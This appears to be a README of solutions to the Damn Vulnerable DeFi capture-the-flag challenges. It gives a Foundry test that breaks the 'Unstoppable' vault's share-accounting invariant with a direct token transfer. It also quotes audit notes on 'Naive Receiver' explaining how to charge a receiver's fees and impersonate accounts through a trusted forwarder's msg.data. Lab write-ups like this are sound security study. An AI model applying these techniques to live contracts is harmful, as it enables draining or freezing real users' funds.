# CTF-Defi
Damn Vulnerable DeFi CTF challenges
## 1. Unstoppable
Test file solution:
```
    function test_unstoppable() public checkSolvedByPlayer {
       
        token.transfer(address(vault),1e18);
        vm.expectRevert("UNAUTHORIZED");
        monitorContract.checkFlashLoan(100e18);

    }
```

core attack on:
```
convertToShares(totalSupply) != balanceBefore
```
## 2. Naive Receiver
In ```FlashLoanReceiver.sol``` line-15:
```
//@audit-issue access control problem, it ignores the first address which is essentially the initiator of the flash loan
// This means that anyone can request flash loans on behalf of this contract and make it pay the fee to the pool
```
In ```NaiveReceiverPool.sol``` line-87:
```
// @audit-issue We can craft a transaction that comes from the trusted forwarder and since we control the msg.data,
// We can make sure the last 20 bytes are any account that we wish to control.
// That way we can impersonate accounts and perform the withdraw function on their behalf
```
